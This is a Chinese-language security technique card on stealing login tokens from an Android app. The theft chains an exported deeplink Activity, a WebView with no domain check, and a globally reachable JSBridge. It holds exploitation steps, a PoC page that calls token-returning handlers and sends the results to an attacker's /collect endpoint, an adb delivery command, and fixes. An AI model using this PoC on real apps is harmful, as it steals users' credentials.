---
id: mobile-android-webview-jsbridge-arbitrary-origin-credential-theft
title: Android WebView JSBridge 任意页面凭证窃取：exported ProxyActivity 路由 + 无域名校验 WebView + 全局 handler 注册表
type: scenario
domain: mobile
path: mobile/android
technique: android-webview-jsbridge-arbitrary-origin-credential-theft
aliases:
- Android JSBridge 凭证窃取
- WebView 任意页面加载
- BridgeWebView 全局 handler
- exported ProxyActivity deeplink
- FlutterSharedPreferences token 泄露
- JSBridge 任意 origin
tags:
- android
- webview
- jsbridge
- deeplink
- exported-activity
- credential-theft
- token
- sharedpreferences
- mobile
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V128
  verified_at: '2026-11-06T04:17:08+08:00'
  notes: 已对照原文与35张图核对：exported ProxyActivity+自定义scheme（图10）、s0 按 link= 截取并 URLDecoder（图25）、hmas:// 被拦截器拒绝而 http/https 放行到 /web/Default（图26-28）、WebActivity C0 仅过滤内部参数无域名校验（图12/13）、shouldOverrideUrlLoading 对 yy:// 交父类且 http/https 放行（图14）、onPageFinished 对任意页面注入 bridge JS（图16-19）、HogeWebViewInitializer 全局注册 40+ handler（图21/22）、getUserInfo→t0()→FlutterSharedPreferences flutter.hmas_token 并回填 Member-User-Authorization/userTokenKey（图23/24）、receiveMessageQueue 初始为 [] 必须先 init（图30）、PoC 页与 collect.log 回传 Bearer JWT（图31/34/35）均一致，属已复现。未验证点：未在本机复跑；原文 scheme 拼写前后有 sjqxxx 与 sjqxx 两种，卡片用 sjqxx。
---

## 一句话结论

App 的 exported `ProxyActivity` 接受 `link=` 任意 URL，经 ARouter 路由到 `/web/Default` 的 `WebActivity`；`WebActivity` 不做域名校验，`BridgeWebView` 在每个 `onPageFinished` 向当前页面注入桥 JS，原生 handler 注册表按 `handlerName` 全局分发且不校验页面 origin。攻击者让 App 加载自己的页面并调用 `getUserInfo`/`getRequestHeader`，即可从 `FlutterSharedPreferences` 取走 JWT/用户信息。

## 原理

- **入口：exported ProxyActivity + 自定义 scheme**：Manifest 中 `com.xxx.android.lib_architecture.splash.ProxyActivity` 为 `exported="true"`，带 `scheme="sjqxx"`、`host="hmas.app"`。其 `s0(Intent)` 从 `intent.getDataString()` 中按 `link=` 切出参数，`URLDecoder.decode` 后原样交给路由系统，没有格式/域名校验。
- **路由链**：`link` 若是 `hmas://...` 会被 `DefaultRouteInterceptor` 拒绝；若是 `http://`/`https://`，则由另一个拦截器 `nb.g` 直接放行，最终 `a5.a.c().a("/web/Default").withString("url", strE)` 拉起 `WebActivity`。因此 deeplink 写成 `sjqxx://hmas.app/message?link=http%3A%2F%2Fattacker%2Fpoc.html` 即可。
- **WebActivity 无域名校验**：`WebActivity` 通过 `@Autowired public String url` 接收任意 URL；`C0(oriUrl)` 只过滤 `hgWebShareBrief` 等内部查询参数，不做域名/白名单校验，直接返回 URL。`shouldOverrideUrlLoading` 对 `yy://` 交给父类，对非 `http://`/`https://` 一律拦截，但 http/https 全部放行。
- **桥注入时机**：`BridgeWebView` 在构造时把 `WebViewJavascriptBridge.js`（assets）设为待注入脚本；`onPageFinished` 中调用 `i5.b.e(...)`，对当前 WebView `loadUrl("javascript:" + bridgeJs)`，不区分当前页面是内部还是外部域名。`setSavePassword(false)`、`setAllowFileAccess(true)`、`setAllowFileAccessFromFileURLs(false)`、`setAllowUniversalAccessFromFileURLs(false)` 等设置并不能阻止桥注入。
- **全局 handler 注册表**：App 启动时 `HogeWebViewInitializer.create()` 把 40 多个 handler（`getUserInfo`、`getRequestHeader`、`getHMASUserInfo`、`getLocation`、`openMapAndNavigation`、`goLogin` 等）一次性注册进全局 Map。Native 收到消息后按 `message.handlerName` 查表执行，**不检查当前 WebView 加载的是哪个域名**。
- **凭证来源**：`getUserInfo` → `wb.a0` → `t0()` → `gd.a.f15853a`（`BaseApplication.INSTANCE.a().getSharedPreferences("FlutterSharedPreferences", 0)`）→ 读取 `flutter.hmas_token`，并把 `Member-User-Authorization`、`userTokenKey` 放入 JSON 响应；`getRequestHeader` 也会返回带 `Bearer` 的 JWT。
- **桥的响应队列坑**：`WebViewJavascriptBridge.js` 中 `receiveMessageQueue` 初始为 `[]`（truthy），`_handleMessageFromNative` 会先 push 而不是 dispatch；必须调用 `WebViewJavascriptBridge.init()`（或等页面加载完成后桥自身把队列置 null）再 `callHandler`，否则回调永远不触发。原文第一次复现时“桥在、回调不来”就是这个原因。

## 触发条件

- App 存在 exported 的自定义 scheme Activity（或可被外部拉起的路由），其参数能控制 WebView 的 `url`。
- WebView 容器不校验 URL 域名/白名单，允许加载任意 http/https 页面。
- JSBridge 在每个页面加载完成后注入，且 handler 注册表全局共享、分发时不校验 origin。
- 敏感 handler（用户信息、请求头、token、位置、登录态）在注册表中可达。
- 攻击者能向用户投递链接（adb、短信、二维码、聊天窗口 HTML 链接等）。

## 利用步骤

1. **Manifest 侦察**：找 `exported="true"` 的 Activity 与 `<data android:scheme=...>`；重点看带 `link=`/`url=` 参数的代理/路由 Activity。
2. **静态分析路由**：跟 `ProxyActivity.s0` → 拦截器 → `WebActivity`，确认 `link` 是否被 URLDecoder 后直接作为 `url`；确认 `C0` 只过滤内部参数、不校验域名。
3. **分析桥与 handler**：找 `BridgeWebView` 的 `onPageFinished` 注入点、assets 中的 `WebViewJavascriptBridge.js`、`HogeWebViewInitializer.create()` 的 handler 注册表；列出 `getUserInfo`/`getRequestHeader` 等敏感 handler。
4. **写恶意页面**：加载后调用 `WebViewJavascriptBridge.init()`，再 `callHandler('getUserInfo', '', cb)`、`callHandler('getRequestHeader', '', cb)`，把回调数据 `fetch` 到攻击者服务器。
5. **投递 deeplink**：`adb shell am start -a android.intent.action.VIEW -d 'sjqxx://hmas.app/message?link=http%3A%2F%2Fattacker%2Fpoc.html'`；真实场景可用短信/二维码/聊天链接。
6. **收取凭证**：在服务器 `/collect` 日志中读取 JWT/用户信息；用 token 访问业务接口验证。

## PoC

恶意页面（最小核心）：

```html
<!DOCTYPE html>
<html><body>
<pre id="log">start</pre>
<script>
function log(m) { document.getElementById('log').textContent += "\n" + m; }
function report(tag, data) {
  log(tag + " => " + JSON.stringify(data));
  fetch('/collect?tag=' + tag + '&d=' + encodeURIComponent(JSON.stringify(data)));
}
var b = window.WebViewJavascriptBridge;
if (!b) { report('probe', 'no bridge'); }
else {
  // 必须先 init，否则 receiveMessageQueue 非空，回调被 push 而不 dispatch
  b.init(function () {
    b.callHandler('getUserInfo', '', function (d) { report('user', d); });
    b.callHandler('getRequestHeader', '', function (d) { report('header', d); });
    b.callHandler('getHMASUserInfo', '', function (d) { report('hmas', d); });
  });
}
</script>
</body></html>
```

投递：

```bash
adb shell am start -a android.intent.action.VIEW \
  -d 'sjqxx://hmas.app/message?link=http%3A%2F%2Fattacker%2Fpoc.html'
```

## 变体与关联

- **入口变体**：exported Activity 直接接 `url`、`WebViewActivity` 通过 Intent extra 接收 URL、ARouter 路由参数注入、深链中间页。
- **桥变体**：`addJavascriptInterface` 注入的 `@JavascriptInterface` 对象、WebMessage/`postWebMessage`、Cordova/React Native WebView 桥；共同点是“页面 origin 不受限 + 原生能力全局可达”。
- **handler 变体**：`getUserInfo`、`getRequestHeader`、`getHMASUserInfo`、`getLocation`、`openMapAndNavigation`、`goLogin`、文件选择/上传、支付、分享；按注册表逐个枚举。
- **token 存储变体**：`FlutterSharedPreferences`、普通 `SharedPreferences`、MMKV、SQLite、KeyStore 加密后仍可被 App 自身读取；WebView 侧只负责触发原生读取。
- **关联卡片**：[[mobile-android-apk-native-gate-hidden-activity-decrypt]]（隐藏 Activity/路由）、[[mobile-android-packer-apkid-frida-dexdump-jadx]]（APK 反编译）、[[mobile-android-ssl-pinning-bypass-cert-frida]]（抓包/动态验证）。
- **边界**：WebView 校验域名白名单、桥只在可信 origin 注入、handler 分发前检查 `webView.getUrl()`、token 不放在 WebView 可触发的 handler 中、deeplink 校验参数时失效。

## 检测与防御

- **检测特征**：Manifest 中 exported + 自定义 scheme；`WebActivity` 接收 `url` 且无域名校验；`onPageFinished` 对任意页面 `loadUrl("javascript:...Bridge.js")`；全局 handler Map 按 `handlerName` 分发；`getUserInfo` 直接读 `FlutterSharedPreferences`。
- **修复**：
  - WebView 加载前对 URL 做严格域名白名单（scheme + host + path），禁止任意 http/https；
  - 只在可信 origin 注入桥 JS（`onPageStarted` 判断 host），或使用 `WebViewAssetLoader` 加载本地页面；
  - handler 分发前校验当前页面 origin/白名单，敏感 handler 加签名/一次性 token；
  - deeplink 参数做格式/域名校验，exported 组件加签名权限或改为 `exported=false`；
  - 不把长期 token 放在可被 WebView 触发的 handler 中，使用短时、最小权限凭证。
- **最小权限**：WebView 关闭不必要的文件访问（`setAllowFileAccess(false)`）、禁止 `file://` 跨域；token 存储使用 Keystore/加密并绑定设备。
